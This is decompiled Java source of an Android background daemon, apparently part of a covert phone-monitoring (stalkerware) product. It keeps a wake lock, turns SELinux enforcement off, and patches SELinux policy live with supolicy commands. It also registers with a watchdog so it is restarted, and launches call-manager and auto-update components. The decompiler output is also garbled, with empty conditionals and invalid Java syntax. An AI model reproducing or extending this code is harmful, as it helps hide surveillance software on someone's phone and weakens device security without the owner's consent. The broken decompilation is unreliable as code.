package com.vvt.daemon;

import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import com.fx.daemon.exception.RunningException;
import com.fx.daemon.util.MyUncaughtExceptionHandler;
import com.fx.daemon.util.WatchingProcess;
import com.fx.pmond.ref.command.RemoteAddProcess;
import com.fx.socket.FxSocketException;
import com.fx.socket.SocketCmd;
import com.fx.socket.command.RemoteCheckAlive;
import com.fx.socket.command.RemoteCheckSync;
import com.fx.socket.command.RemoteNotifyProcessCrash;
import com.fx.socket.command.RemoteSetSync;
import com.fx.socket.command.RemoteSetSync.SyncData;
import com.fx.socket.command.RemoteShutdownRequest;
import com.vvt.appengine.AppEngine1;
import com.vvt.appengine.AppStartUpHandler;
import com.vvt.base.RunningMode;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import com.vvt.shell.ShellUtil.SELinuxMode;
import java.io.IOException;
import java.util.Timer;
import java.util.concurrent.Callable;

public class MainDaemonMain
  implements com.fx.socket.a
{
  private boolean a;
  private boolean b;
  private boolean c;
  private Context d;
  private ContentResolver e;
  private i f;
  private PowerManager.WakeLock g;
  private com.fx.socket.b h;
  private boolean i;
  private Callable j;
  
  public MainDaemonMain()
  {
    boolean bool = com.vvt.ak.a.a;
    this.a = bool;
    bool = com.vvt.ak.a.b;
    this.b = bool;
    bool = com.vvt.ak.a.e;
    this.c = bool;
    e locale = new com/vvt/daemon/e;
    locale.<init>(this);
    this.j = locale;
  }
  
  private void a(boolean paramBoolean)
  {
    boolean bool1 = this.b;
    if (bool1) {}
    bool1 = this.b;
    if (bool1) {}
    bool1 = this.b;
    if (bool1) {}
    for (;;)
    {
      try
      {
        bool1 = this.b;
        if (bool1) {}
        d();
        bool1 = this.b;
        if (bool1) {}
        com.vvt.s.a.a();
        Object localObject1 = "maind";
        bool2 = ShellUtil.a((String)localObject1);
        if (bool2)
        {
          localObject1 = new com/fx/daemon/exception/RunningException;
          localObject3 = "Daemon is already running";
          ((RunningException)localObject1).<init>((String)localObject3);
          throw ((Throwable)localObject1);
        }
      }
      finally
      {
        bool1 = this.c;
        if (bool1) {}
        i();
        bool1 = this.b;
        if (bool1) {}
        return;
      }
      Object localObject3 = com.vvt.m.b.c;
      Object localObject4 = AppStartUpHandler.AppStartUpMethod.STARTUP_SCRIPT;
      AppStartUpHandler.a((String)localObject3, (AppStartUpHandler.AppStartUpMethod)localObject4);
      boolean bool2 = this.b;
      if (bool2) {}
      e();
      com.fx.daemon.b.b(str);
      bool1 = this.b;
      if (bool1) {}
      Object localObject2 = "MainDaemonMain";
      com.fx.daemon.b.a((String)localObject2);
      bool1 = this.b;
      if (bool1) {}
      Looper.prepareMainLooper();
      bool1 = this.b;
      if (bool1) {}
      localObject2 = com.fx.daemon.b.b();
      this.d = ((Context)localObject2);
      localObject2 = this.d;
      localObject2 = ((Context)localObject2).getContentResolver();
      this.e = ((ContentResolver)localObject2);
      localObject2 = this.d;
      bool1 = a((Context)localObject2);
      if (bool1)
      {
        bool1 = this.b;
        if (bool1) {}
        bool1 = com.vvt.aa.a.b();
        if (bool1)
        {
          bool1 = this.b;
          if (bool1) {}
          com.vvt.polymorphic.b.a();
        }
        bool1 = this.b;
        if (bool1) {}
        m();
        bool1 = this.b;
        if (bool1) {}
        n();
        bool1 = this.b;
        if (bool1) {}
        o();
        bool1 = this.b;
        if (bool1) {}
        bool1 = l();
        if (bool1) {
          break label334;
        }
        bool1 = this.c;
        if (bool1) {}
        ShellUtil.a();
        continue;
      }
      bool1 = this.c;
      if (bool1) {}
      ShellUtil.a();
      continue;
      label334:
      bool1 = this.b;
      if (bool1) {}
      localObject2 = new com/vvt/daemon/i;
      localObject3 = this.d;
      localObject4 = com.vvt.m.b.c;
      ((i)localObject2).<init>((Context)localObject3, (String)localObject4);
      this.f = ((i)localObject2);
      try
      {
        bool1 = this.b;
        if (bool1) {}
        localObject2 = this.f;
        ((i)localObject2).k();
        bool1 = this.b;
        if (bool1) {}
        q();
        bool1 = this.b;
        if (bool1) {}
        localObject2 = this.e;
        localObject3 = com.vvt.m.b.e;
        localObject4 = null;
        ((ContentResolver)localObject2).notifyChange((Uri)localObject3, null);
        bool1 = this.b;
        if (bool1) {}
        g();
        bool1 = this.b;
        if (bool1) {}
        b();
        if (paramBoolean) {
          f();
        }
        bool1 = this.b;
        if (bool1) {}
        Looper.loop();
      }
      catch (FxSocketException localFxSocketException)
      {
        RunningException localRunningException = new com/fx/daemon/exception/RunningException;
        localObject3 = "Socket server setup failed";
        localRunningException.<init>((String)localObject3);
        throw localRunningException;
      }
    }
  }
  
  private boolean a(Context paramContext)
  {
    int k = 1;
    Object localObject1 = (PowerManager)paramContext.getSystemService("power");
    Object localObject2 = this.g;
    if (localObject2 != null)
    {
      localObject2 = this.g;
      boolean bool1 = ((PowerManager.WakeLock)localObject2).isHeld();
      if (bool1) {}
    }
    else
    {
      localObject2 = "MainDaemonMain";
      localObject1 = ((PowerManager)localObject1).newWakeLock(k, (String)localObject2);
      this.g = ((PowerManager.WakeLock)localObject1);
      localObject1 = this.g;
      ((PowerManager.WakeLock)localObject1).acquire();
    }
    localObject1 = this.g;
    boolean bool2;
    if (localObject1 != null)
    {
      localObject1 = this.g;
      bool2 = ((PowerManager.WakeLock)localObject1).isHeld();
      if (bool2) {
        bool2 = k;
      }
    }
    for (;;)
    {
      return bool2;
      bool2 = false;
      localObject1 = null;
    }
  }
  
  private void b()
  {
    boolean bool1 = this.b;
    if (bool1) {}
    Object localObject1 = com.vvt.m.b.c;
    bool1 = com.vvt.autoupdate.d.b((String)localObject1);
    this.i = bool1;
    bool1 = this.b;
    if (bool1) {}
    bool1 = this.i;
    if (bool1)
    {
      localObject1 = new com/vvt/autoupdate/d;
      ((com.vvt.autoupdate.d)localObject1).<init>();
      Object localObject2 = this.d;
      ((com.vvt.autoupdate.d)localObject1).a((Context)localObject2);
      localObject2 = com.vvt.m.b.c;
      ((com.vvt.autoupdate.d)localObject1).a((String)localObject2);
      boolean bool2 = this.b;
      if (bool2) {}
      localObject2 = RunningMode.FULL;
      ((com.vvt.autoupdate.d)localObject1).a((RunningMode)localObject2);
      bool1 = this.b;
      if (bool1) {}
      bool1 = false;
      localObject1 = Boolean.valueOf(false);
      localObject2 = com.vvt.m.b.c;
      com.vvt.autoupdate.d.a((Boolean)localObject1, (String)localObject2);
    }
    bool1 = this.b;
    if (bool1) {}
  }
  
  private void c()
  {
    bool = this.b;
    if (bool) {}
    com.fx.a.a.a locala = new com/fx/a/a/a;
    locala.<init>();
    bool = this.a;
    if (bool) {}
    String[] arrayOfString = new String[1];
    bool = false;
    Object localObject = "0";
    arrayOfString[0] = localObject;
    String str = "MainDaemonMain";
    try
    {
      localObject = this.d;
      localObject = ((Context)localObject).getContentResolver();
      Uri localUri = com.fx.a.a.b.f;
      long l = 180000L;
      com.fx.daemon.b.a(str, (ContentResolver)localObject, localUri, locala, l, arrayOfString);
      bool = this.b;
      if (!bool) {}
    }
    catch (RunningException localRunningException)
    {
      for (;;)
      {
        bool = this.c;
        if (!bool) {}
      }
    }
    bool = this.b;
    if (bool) {}
  }
  
  private void d()
  {
    boolean bool1 = com.vvt.ad.a.a();
    int k = this.b;
    if ((k == 0) || (!bool1))
    {
      k = this.b;
      if (k == 0) {}
    }
    for (;;)
    {
      return;
      k = 0;
      for (;;)
      {
        int n = 5;
        if (k >= n) {
          break;
        }
        if (!bool1) {
          break label109;
        }
        ShellUtil.SELinuxMode localSELinuxMode1 = ShellUtil.d();
        boolean bool4 = this.b;
        if (bool4) {}
        ShellUtil.SELinuxMode localSELinuxMode2 = ShellUtil.SELinuxMode.ENFORCING;
        if (localSELinuxMode1 != localSELinuxMode2) {
          break label97;
        }
        ShellUtil.e();
        boolean bool3 = this.b;
        if (bool3) {}
        long l = 500L;
        SystemClock.sleep(l);
        int m;
        k += 1;
      }
      label97:
      boolean bool2 = this.b;
      if (bool2)
      {
        continue;
        label109:
        bool2 = this.b;
        if (!bool2) {}
      }
    }
  }
  
  private void e()
  {
    boolean bool = com.vvt.aa.a.c();
    Object localObject;
    String str;
    if (bool)
    {
      bool = com.vvt.aa.c.a();
      if (bool)
      {
        bool = this.b;
        if (bool) {}
        bool = this.b;
        if (bool) {}
        localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        localObject = ((StringBuilder)localObject).append("supolicy --live ").append("\"").append("allow radio init_shell unix_stream_socket connectto").append("\"");
        str = "\n";
        localObject = str;
      }
    }
    try
    {
      KMShell.a((String)localObject);
      bool = com.vvt.aa.a.b();
      if (bool)
      {
        bool = this.b;
        if (bool) {}
        long l = 2000L;
        SystemClock.sleep(l);
        bool = this.b;
        if (bool) {}
        localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        localObject = ((StringBuilder)localObject).append("supolicy --live ").append("\"").append("allow radio socket_device sock_file write").append("\"");
        str = "\n";
        localObject = str;
      }
    }
    catch (Exception localException1)
    {
      try
      {
        do
        {
          KMShell.a((String)localObject);
          return;
          localException1 = localException1;
          bool = this.c;
        } while (!bool);
      }
      catch (Exception localException2)
      {
        for (;;)
        {
          bool = this.c;
          if (!bool) {}
        }
      }
    }
  }
  
  private void f()
  {
    c localc = new com/vvt/daemon/c;
    localc.<init>(this);
    boolean bool = this.b;
    if (bool) {}
    Timer localTimer = new java/util/Timer;
    localTimer.<init>();
    localTimer.schedule(localc, 1000L);
  }
  
  private void g()
  {
    Object localObject = Runtime.getRuntime();
    d locald = new com/vvt/daemon/d;
    locald.<init>(this);
    ((Runtime)localObject).addShutdownHook(locald);
    localObject = new com/fx/daemon/util/c;
    String str = com.vvt.m.b.c;
    Callable localCallable = this.j;
    ((MyUncaughtExceptionHandler)localObject).<init>("MainDaemonMain", str, localCallable);
    Thread.setDefaultUncaughtExceptionHandler((Thread.UncaughtExceptionHandler)localObject);
  }
  
  private void h()
  {
    boolean bool = this.a;
    if (bool) {}
    bool = com.vvt.aa.a.c();
    RemoteNotifyProcessCrash localRemoteNotifyProcessCrash;
    if (bool)
    {
      localRemoteNotifyProcessCrash = new com/fx/socket/command/RemoteNotifyProcessCrash;
      String str1 = "com.fx.socket.pmond";
      String str2 = "maind";
      localRemoteNotifyProcessCrash.<init>(str1, str2);
    }
    for (;;)
    {
      try
      {
        localRemoteNotifyProcessCrash.execute();
        bool = this.a;
        if (bool) {}
        return;
      }
      catch (IOException localIOException)
      {
        bool = this.c;
        if (!bool) {
          continue;
        }
        continue;
      }
      bool = this.a;
      if (!bool) {}
    }
  }
  
  private void i()
  {
    for (;;)
    {
      try
      {
        bool = this.i;
        if (bool)
        {
          bool = this.a;
          if (bool) {}
          c();
        }
        localObject1 = this.h;
        if (localObject1 == null) {}
      }
      catch (Exception localException)
      {
        Object localObject1;
        boolean bool = this.c;
        if (!bool) {
          continue;
        }
        continue;
        bool = this.c;
        if (!bool) {
          continue;
        }
        continue;
      }
      synchronized (this.h)
      {
        bool = this.b;
        if (bool) {}
        localObject1 = this.h;
        ((com.fx.socket.b)localObject1).a();
        bool = false;
        localObject1 = null;
        this.h = null;
        bool = this.b;
        if (bool) {}
        localObject1 = this.f;
        if (localObject1 != null)
        {
          bool = this.b;
          if (bool) {}
          localObject1 = this.f;
          ((i)localObject1).d();
          localObject1 = this.f;
          ((i)localObject1).l();
          bool = false;
          localObject1 = null;
          this.f = null;
          bool = this.b;
          if (bool) {}
          localObject1 = this.e;
          if (localObject1 != null)
          {
            bool = this.b;
            if (bool) {}
            localObject1 = this.e;
            ??? = com.vvt.m.b.e;
            ((ContentResolver)localObject1).notifyChange((Uri)???, null);
          }
          bool = this.b;
          if (bool) {}
          long l = 5000L;
          SystemClock.sleep(l);
          bool = this.b;
          if (bool) {}
          ShellUtil.a();
          return;
        }
      }
    }
  }
  
  private void j()
  {
    boolean bool1 = this.a;
    if (bool1) {}
    bool1 = this.b;
    if (bool1) {}
    long l1 = 120000L;
    com.vvt.callmanager.ref.a locala = new com/vvt/callmanager/ref/a;
    locala.<init>();
    bool1 = com.vvt.aa.a.c();
    if (bool1)
    {
      bool1 = com.vvt.aa.c.a();
      if (bool1)
      {
        bool1 = this.a;
        if (bool1) {}
        long l2 = 10000L;
        SystemClock.sleep(l2);
      }
    }
    Object localObject = "MainDaemonMain";
    ContentResolver localContentResolver = this.e;
    Uri localUri = com.vvt.callmanager.ref.d.b;
    bool1 = com.fx.daemon.b.b((String)localObject, localContentResolver, localUri, locala, l1);
    boolean bool2 = this.a;
    if ((!bool2) || (!bool1))
    {
      localObject = new com/fx/daemon/exception/RunningException;
      ((RunningException)localObject).<init>("Daemon startup take too long");
      throw ((Throwable)localObject);
    }
    bool1 = this.a;
    if (bool1) {}
  }
  
  private void k()
  {
    WatchingProcess localWatchingProcess = new com/fx/daemon/util/WatchingProcess;
    localWatchingProcess.<init>();
    localWatchingProcess.setProcessName("maind");
    Object localObject = new java/lang/StringBuilder;
    ((StringBuilder)localObject).<init>();
    String str = h.c;
    localObject = ((StringBuilder)localObject).append(str);
    str = " 1";
    localObject = str;
    localWatchingProcess.setStartupScriptPath((String)localObject);
    localWatchingProcess.setServerName("com.fx.socket.maind");
    localObject = new com/fx/pmond/ref/command/RemoteAddProcess;
    ((RemoteAddProcess)localObject).<init>(localWatchingProcess);
    try
    {
      ((RemoteAddProcess)localObject).execute();
      return;
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        boolean bool = this.c;
        if (!bool) {}
      }
    }
  }
  
  private boolean l()
  {
    boolean bool1 = this.a;
    if (bool1) {}
    bool1 = false;
    com.fx.socket.b localb = this.h;
    if (localb != null)
    {
      localb = this.h;
      localb.a();
      bool2 = this.b;
      if (!bool2) {}
    }
    try
    {
      localb = new com/fx/socket/b;
      String str1 = "MainDaemonMain";
      String str2 = "com.fx.socket.maind";
      localb.<init>(str1, str2, this);
      this.h = localb;
      localb = this.h;
      str1 = "MainDaemonMainSocketCmdServerThread";
      localb.setName(str1);
      localb = this.h;
      localb.start();
      bool1 = true;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool2 = this.c;
        if (!bool2) {}
      }
    }
    bool2 = this.a;
    if (bool2) {}
    return bool1;
  }
  
  private void m()
  {
    localObject1 = "pmond";
    bool1 = ShellUtil.a((String)localObject1);
    bool2 = this.a;
    com.fx.pmond.ref.b localb;
    if ((!bool2) || (!bool1))
    {
      bool1 = this.b;
      if (bool1) {}
      localb = new com/fx/pmond/ref/b;
      localb.<init>();
      localObject1 = "MainDaemonMain";
    }
    try
    {
      localObject2 = this.d;
      localObject2 = ((Context)localObject2).getContentResolver();
      localObject3 = com.fx.pmond.ref.c.f;
      long l = 30000L;
      com.fx.daemon.b.b((String)localObject1, (ContentResolver)localObject2, (Uri)localObject3, localb, l);
    }
    catch (RunningException localRunningException)
    {
      for (;;)
      {
        try
        {
          Object localObject2;
          Object localObject3;
          localObject1 = ((RemoteCheckSync)localObject1).execute();
          localObject1 = (Boolean)localObject1;
          bool1 = ((Boolean)localObject1).booleanValue();
          bool2 = this.a;
          if ((!bool2) || (!bool1))
          {
            bool1 = this.b;
            if (bool1) {}
            k();
            localObject1 = new com/fx/socket/command/RemoteSetSync$SyncData;
            ((RemoteSetSync.SyncData)localObject1).<init>();
            localObject2 = "com.fx.maind";
            ((RemoteSetSync.SyncData)localObject1).setClientPackage((String)localObject2);
            bool2 = true;
            ((RemoteSetSync.SyncData)localObject1).setSync(bool2);
            localObject2 = new com/fx/socket/command/RemoteSetSync;
            localObject3 = "com.fx.socket.pmond";
            ((RemoteSetSync)localObject2).<init>((String)localObject3, (RemoteSetSync.SyncData)localObject1);
            ((RemoteSetSync)localObject2).execute();
            bool1 = this.b;
            if (!bool1) {}
          }
          return;
        }
        catch (IOException localIOException)
        {
          bool1 = this.c;
          if (!bool1) {
            continue;
          }
          continue;
        }
        localRunningException = localRunningException;
        bool1 = this.c;
        if (!bool1) {}
      }
    }
    localObject1 = new com/fx/socket/command/RemoteCheckSync;
    localObject2 = "com.fx.socket.pmond";
    localObject3 = "com.fx.maind";
    ((RemoteCheckSync)localObject1).<init>((String)localObject2, (String)localObject3);
  }
  
  public static void main(String[] paramArrayOfString)
  {
    boolean bool = false;
    String str1 = null;
    String str2 = com.vvt.m.b.c;
    String str3 = "fx.log";
    com.fx.daemon.b.a("MainDaemonMain", str2, str3);
    MainDaemonMain localMainDaemonMain = new com/vvt/daemon/MainDaemonMain;
    localMainDaemonMain.<init>();
    int k = paramArrayOfString.length;
    if (k > 0)
    {
      str2 = "1";
      str1 = paramArrayOfString[0];
      bool = str2.equals(str1);
    }
    localMainDaemonMain.a(bool);
  }
  
  private void n()
  {
    Object localObject1 = this.d;
    bool1 = com.vvt.aa.b.a((Context)localObject1);
    boolean bool2 = this.a;
    Object localObject2;
    String str;
    if ((!bool2) || (bool1))
    {
      bool1 = a();
      bool2 = this.a;
      if ((!bool2) || (!bool1))
      {
        bool1 = this.b;
        if (bool1) {}
        j();
      }
      localObject1 = new com/fx/socket/command/RemoteCheckSync;
      localObject2 = "com.fx.socket.callmgrd";
      str = "com.fx.maind";
      ((RemoteCheckSync)localObject1).<init>((String)localObject2, str);
    }
    for (;;)
    {
      try
      {
        localObject1 = ((RemoteCheckSync)localObject1).execute();
        localObject1 = (Boolean)localObject1;
        bool1 = ((Boolean)localObject1).booleanValue();
        bool2 = this.a;
        if ((!bool2) || (!bool1))
        {
          bool1 = this.b;
          if (bool1) {}
          localObject1 = this.f;
          if (localObject1 == null) {
            continue;
          }
        }
      }
      catch (IOException localIOException)
      {
        bool1 = this.c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      try
      {
        bool1 = this.b;
        if (bool1) {}
        localObject1 = this.f;
        localObject1 = ((i)localObject1).a();
        if (localObject1 == null) {
          continue;
        }
        localObject1 = ((com.vvt.appengine.a)localObject1).a();
        if (localObject1 == null) {
          continue;
        }
        bool2 = this.b;
        if (bool2) {}
        com.vvt.appengine.i.c((AppEngine1)localObject1);
        localObject2 = ((AppEngine1)localObject1).b;
        if (localObject2 == null) {
          continue;
        }
        bool2 = this.b;
        if (bool2) {}
        localObject1 = ((AppEngine1)localObject1).b;
        ((com.vvt.callmanager.ref.e)localObject1).c();
      }
      catch (Exception localException)
      {
        bool1 = this.c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      localObject1 = new com/fx/socket/command/RemoteSetSync$SyncData;
      ((RemoteSetSync.SyncData)localObject1).<init>();
      localObject2 = "com.fx.maind";
      ((RemoteSetSync.SyncData)localObject1).setClientPackage((String)localObject2);
      bool2 = true;
      ((RemoteSetSync.SyncData)localObject1).setSync(bool2);
      localObject2 = new com/fx/socket/command/RemoteSetSync;
      str = "com.fx.socket.callmgrd";
      ((RemoteSetSync)localObject2).<init>(str, (RemoteSetSync.SyncData)localObject1);
      ((RemoteSetSync)localObject2).execute();
      bool1 = this.b;
      if (bool1) {}
      return;
      bool1 = this.c;
      if (bool1)
      {
        continue;
        bool1 = this.c;
        if (bool1)
        {
          continue;
          bool1 = this.c;
          if (bool1)
          {
            continue;
            bool1 = this.a;
            if (!bool1) {}
          }
        }
      }
    }
  }
  
  private void o()
  {
    String str = "psysd";
    boolean bool1 = ShellUtil.a(str);
    boolean bool2 = this.a;
    if (bool2) {}
    bool2 = p();
    boolean bool3 = this.a;
    com.fx.psysd.d locald;
    if ((!bool3) || ((!bool1) && (bool2)))
    {
      bool1 = this.b;
      if (bool1) {}
      locald = new com/fx/psysd/d;
      locald.<init>();
      str = "MainDaemonMain";
    }
    try
    {
      Object localObject = this.d;
      localObject = ((Context)localObject).getContentResolver();
      Uri localUri = com.fx.psysd.ref.a.f;
      long l = 30000L;
      com.fx.daemon.b.a(str, (ContentResolver)localObject, localUri, locald, l);
      return;
    }
    catch (RunningException localRunningException)
    {
      for (;;)
      {
        bool1 = this.c;
        if (!bool1) {}
      }
    }
  }
  
  private boolean p()
  {
    return true;
  }
  
  private void q()
  {
    long l1 = 1800000L;
    long l2 = 47000L;
    double d1 = 2.3221E-319D;
    g localg = new com/vvt/daemon/g;
    localg.<init>(this);
    Timer localTimer = new java/util/Timer;
    localTimer.<init>();
    boolean bool = com.vvt.aa.a.c();
    if (bool) {
      localTimer.schedule(localg, l1, l1);
    }
    for (;;)
    {
      return;
      l1 = l2;
      localTimer.schedule(localg, l2, l2);
    }
  }
  
  public Object a(SocketCmd paramSocketCmd)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    Object localObject = null;
    boolean bool3 = paramSocketCmd instanceof RemoteCheckAlive;
    if (bool3)
    {
      bool2 = this.a;
      if (bool2) {}
      localObject = Boolean.valueOf(bool1);
    }
    for (;;)
    {
      return localObject;
      bool3 = paramSocketCmd instanceof RemoteShutdownRequest;
      if (bool3)
      {
        bool2 = this.a;
        if (bool2) {}
        localObject = new java/lang/Thread;
        f localf = new com/vvt/daemon/f;
        localf.<init>(this);
        ((Thread)localObject).<init>(localf);
        ((Thread)localObject).start();
        localObject = Boolean.valueOf(bool1);
      }
    }
  }
  
  boolean a()
  {
    String str1 = "callmond";
    boolean bool1 = ShellUtil.a(str1);
    String str2 = "callmgrd";
    boolean bool2 = ShellUtil.a(str2);
    boolean bool3 = this.b;
    if ((!bool3) || ((bool1) && (bool2))) {
      bool1 = true;
    }
    for (;;)
    {
      return bool1;
      bool1 = false;
      str1 = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/daemon/MainDaemonMain.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */